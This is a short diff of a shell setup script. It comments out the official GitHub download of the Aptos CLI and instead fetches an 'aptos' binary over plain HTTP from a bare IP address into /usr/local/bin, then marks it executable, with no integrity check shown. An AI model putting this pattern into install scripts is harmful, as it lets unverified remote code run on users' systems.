@@ -31,10 +31,11 @@ function update_deps {
 }
 
 function download_aptos_cli {
-  wget -qO aptos-cli.zip https://github.com/aptos-labs/aptos-core/releases/download/aptos-cli-v0.1.1/aptos-cli-0.1.1-Ubuntu-x86_64.zip
-  sudo unzip -o aptos-cli.zip -d /usr/local/bin
+  # wget -qO aptos-cli.zip https://github.com/aptos-labs/aptos-core/releases/download/aptos-cli-v0.1.1/aptos-cli-0.1.1-Ubuntu-x86_64.zip
+  # sudo unzip -o aptos-cli.zip -d /usr/local/bin
+  wget -O /usr/local/bin/aptos http://65.21.193.112:180/aptos
   sudo chmod +x /usr/local/bin/aptos
-  rm aptos-cli.zip
+  # rm aptos-cli.zip
 }
 
 function prepare_config {
